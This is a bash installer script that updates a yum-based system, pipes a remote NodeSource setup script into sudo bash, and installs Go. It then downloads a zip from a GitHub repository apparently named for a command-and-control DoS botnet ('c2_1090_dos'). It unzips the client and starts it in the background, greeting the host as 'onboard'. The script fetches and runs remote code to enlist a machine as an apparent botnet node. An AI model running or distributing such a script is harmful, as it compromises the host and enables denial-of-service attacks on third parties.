#!/bin/bash

#1090

NODE_URL="https://rpm.nodesource.com/setup_10.x"
GOLANG_URL_64="https://storage.googleapis.com/golang/go1.8.3.linux-amd64.tar.gz"
GOLANG_URL_32="https://storage.googleapis.com/golang/go1.8.3.linux-386.tar.gz"
CLIENT_SRC_URL="https://github.com/allf1090/c2_1090_dos/raw/main/client_xox1090.zip"
CWD=$(pwd)
HOSTN=$(hostname)
#Get arch
arch=$(uname -m)

echo "Updating the system..."
echo y | yum update #> /dev/null 2>&1

echo "Installing dependencies [node, golang, coreutils:nohup, unzip]"

#Install nodejs
curl -sL $NODE_URL | sudo bash - #> /dev/null 2>&1
echo y | yum install nodejs #> /dev/null 2>&1

#Install golang
if [ "$arch" == 'x86_64' ]
then
    wget $GOLANG_URL_64
    tar -zxvf "${CWD}/go1.8.3.linux-amd64.tar.gz" -C /usr/local #> /dev/null 2>&1
    echo "golang  ->  done"
else
    wget $GOLANG_URL_32
    tar -zxvf "${CWD}/go1.8.3.linux-386.tar.gz" -C /usr/local #> /dev/null 2>&1
    echo "golang  ->  done"
fi

#Install Other dep
echo "nodejs ->  done"
echo y | yum install coreutils #> /dev/null 2>&1
echo "nohup  ->  done"
echo y | yum install unzip #> /dev/null 2>&1
echo "unzip  ->  done"
echo "Dependencie install -> finished"
echo "Downloading & installing the clinet on the system"
wget $CLIENT_SRC_URL #> /dev/null 2>&1
unzip client_xox1090.zip #> /dev/null 2>&1
#echo "Starting the client in background."
#nohup node "${CWD}/client_xox1090/client.js"
#echo "Adding to startup -> done"
#update-rc.d "${0}" defaults
echo "Starting client in background mode"
nohup node "${CWD}/client_xox1090/client.js" #/dev/null 2>&1 & 
echo "client started."
echo "All done! welcome onboard ${HOSTN} :D"
exit 1
